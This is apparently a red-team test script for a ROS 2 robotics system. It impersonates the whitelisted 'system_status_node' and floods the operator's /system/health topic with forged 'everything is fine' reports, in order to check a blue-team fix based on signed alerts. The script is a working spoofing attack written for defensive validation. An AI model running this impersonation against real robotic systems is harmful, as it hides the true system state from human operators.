#!/usr/bin/env python3
"""攻擊 N8 — /system/health spoof (operator dashboard hijack).

藍方自己預判的攻擊。漏洞：
    system_status_node._publish_health 以前直接 publish raw String 到
    /system/health，operator 看的就是這條 topic。任何人偽裝成
    system_status_node（白名單）publish 任意字串到 /system/health，
    operator 看到的就是攻擊者寫的內容。

藍方修補：
    1. system_status 改用 sign_alert(channel=CH_HEALTH) 發送
    2. system_status 訂自己發的 /system/health → 看到不認識的 nonce → 透過
       /security/alerts 發 N8 防護警報

驗證方式：
    若修補成功：system_status 會在 attacker publish 後印出
        🛑 [N8 防護] /system/health 收到未簽章/...
    並透過 /security/alerts 告知整套系統
"""
import sys
import time
import rclpy
from rclpy.node import Node
from std_msgs.msg import String


WHITELISTED_NAME = 'system_status_node'


class HealthSpoofer(Node):

    def __init__(self):
        super().__init__(WHITELISTED_NAME)
        self._pub = self.create_publisher(String, '/system/health', 10)
        self._n = 0
        self.create_timer(0.2, self._spoof)
        self.get_logger().error(
            f'🕵️ 偽裝為「{WHITELISTED_NAME}」5Hz publish 假 /system/health'
        )

    def _spoof(self):
        self._n += 1
        text = (
            '\n========== 系統健康報告 ==========\n'
            '感測器: ✅ ATTACKER_SAYS_SAFE\n'
            '任務:   PATROL\n'
            '資安:   ✅ EVERYTHING_IS_FINE\n'
            '=================================='
        )
        m = String()
        m.data = text
        self._pub.publish(m)
        if self._n % 10 == 0:
            self.get_logger().warn(f'  [t={self._n*0.2:.0f}s] spoofed health #{self._n}')


def main():
    rclpy.init()
    node = HealthSpoofer()
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else 15.0
    deadline = time.monotonic() + duration
    try:
        while rclpy.ok() and time.monotonic() < deadline:
            rclpy.spin_once(node, timeout_sec=0.2)
    finally:
        node.get_logger().error('⏹ 結束')
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
